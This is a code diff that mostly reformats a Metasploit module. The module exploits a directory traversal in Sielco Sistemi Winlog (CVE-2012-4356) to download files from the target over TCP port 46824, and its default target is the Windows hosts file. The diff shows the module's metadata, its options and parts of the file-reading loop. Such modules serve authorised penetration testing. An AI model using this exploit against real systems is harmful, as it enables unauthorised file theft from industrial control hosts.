@@ -9,36 +9,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Sielco Sistemi Winlog Remote File Access',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Sielco Sistemi Winlog Remote File Access',
+        'Description' => %q{
           This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability
-        exists in the Runtime.exe service and can be triggered by sending a specially crafted packet
-        to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite
-        2.07.14.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          exists in the Runtime.exe service and can be triggered by sending a specially crafted packet
+          to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite
+          2.07.14.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Luigi Auriemma', # Vulnerability Discovery and PoC
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2012-4356' ],
           [ 'OSVDB', '83275' ],
           [ 'BID', '54212' ],
           [ 'EDB', '19409'],
           [ 'URL', 'http://aluigi.altervista.org/adv/winlog_2-adv.txt' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(46824),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/WINDOWS/system32/drivers/etc/hosts']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 10])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -88,8 +95,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error "#{ip}:#{rport} - Error getting the file length"
       return
     end
-    file_length = response[1,4].unpack("V").first
-
+    file_length = response[1, 4].unpack("V").first
 
     # Read File with the help of _TCPIPS_BinGetStringRecordFP
     contents = ""
@@ -104,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       response = ""
 
       while response.length < 0x7ac # Packets of 0x7ac (header (0x9) + block of data (0x7a3))
-        response << sock.get_once(0x7ac-response.length, 5) || ''
+        response << sock.get_once(0x7ac - response.length, 5) || ''
       end
       if response.unpack("C").first != 0x98
         print_error "#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish"
@@ -143,6 +149,5 @@ class MetasploitModule < Msf::Auxiliary
       datastore['FILEPATH']
     )
     print_status("#{ip}:#{rport} - File saved in: #{path}")
-
   end
 end
